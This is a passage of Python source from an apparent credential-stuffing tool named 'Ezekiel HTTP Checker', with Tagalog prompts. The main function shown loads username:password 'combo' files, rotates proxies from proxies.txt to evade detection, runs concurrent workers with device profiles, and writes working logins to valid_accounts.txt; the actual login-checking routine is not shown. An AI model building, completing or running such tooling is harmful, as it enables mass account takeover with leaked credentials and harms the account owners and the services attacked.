        f"{C.Y}Ilang workers ang gusto mo? (1-{MAX_WORKERS}, default {default}): {C.RST}"
    ).strip()
    if not raw:
        return default
    try:
        val = int(raw)
        return max(1, min(val, MAX_WORKERS))
    except ValueError:
        print(f"{C.Y}Invalid number, gagamitin ang default na {default} workers.{C.RST}")
        return default


def _prompt_use_proxy(default=True):
    raw = input(
        f"{C.Y}Gamitin ang proxies.txt? (y/n, default {'y' if default else 'n'}): {C.RST}"
    ).strip().lower()
    if not raw:
        return default
    return raw in ("y", "yes", "1", "true")


def main():
    parser = argparse.ArgumentParser(description="Ezekiel HTTP Checker")
    parser.add_argument("combo_arg", nargs="?", default="", help="Optional combo file path")
    parser.add_argument("--workers", type=int, default=0, help="Number of concurrent workers (e.g. 10)")
    parser.add_argument("--no-proxy", action="store_true", help="Disable proxies.txt")
    args = parser.parse_args()

    os.system('clear' if os.name != 'nt' else 'cls')
    print(f"{C.C}================================================={C.RST}")
    print(f"{C.M}       EZEKIEL HTTP CHECKER (FAST MODE)          {C.RST}")
    print(f"{C.C}================================================={C.RST}\n")

    if args.workers > 0:
        num_workers = max(1, min(args.workers, MAX_WORKERS))
    else:
        num_workers = _prompt_workers(DEFAULT_WORKERS)

    use_proxy = False if args.no_proxy else _prompt_use_proxy(default=True)
    print(f"{C.G}Active Config: {num_workers} Workers | Delay: {WORKER_DELAY}s | Proxy: {'ON' if use_proxy else 'OFF'}{C.RST}\n")

    file_name = args.combo_arg.strip() or input(f"{C.Y}Enter combo file (e.g., combos.txt): {C.RST}").strip()
    if not os.path.exists(file_name):
        print(f"{C.R}File not found!{C.RST}")
        return

    with open(file_name, "r", encoding="utf-8", errors="ignore") as f:
        combos = [
            (line.strip().split(":", 1)[0].strip(), line.strip().split(":", 1)[1].strip())
            for line in f
            if ":" in line.strip()
        ]
    combos = [(u, p) for u, p in combos if u and p]

    if not combos:
        print(f"{C.R}No valid combos in file.{C.RST}")
        return

    dm = None
    if INFO_OK and DeviceManager:
        try:
            dm = DeviceManager(DEVICES_FILE)
        except Exception:
            dm = None

    raw_proxies = load_proxies(PROXY_FILE) if use_proxy else []
    parsed_proxies = [p for r in raw_proxies if (p := parse_proxy(r))]
    rotator = ProxyRotator([], proxy_file=PROXY_FILE) if use_proxy else None

    if use_proxy and not parsed_proxies:
        print(f"{C.Y}[!] Walang proxy sa proxies.txt — magpapatuloy nang walang proxy.{C.RST}")
        use_proxy = False
        rotator = None
    elif use_proxy and rotator:
        rotator._proxies = parsed_proxies

    try:
        valid_list, invalid_list = asyncio.run(
            _run_checker(combos, dm, rotator, use_proxy, desired_workers=num_workers)
        )
    except KeyboardInterrupt:
        print(f"\n{C.R}Stopped by user.{C.RST}")
        return

    if valid_list:
        print(f"\n{C.G}✅ {len(valid_list)} VALID accounts saved to valid_accounts.txt{C.RST}")

    if invalid_list:
        with open("invalid_accounts.txt", "w", encoding="utf-8") as f:
            f.write("\n".join(invalid_list))
        print(f"{C.R}❌ {len(invalid_list)} INVALID accounts saved to invalid_accounts.txt{C.RST}")


if __name__ == "__main__":
    main()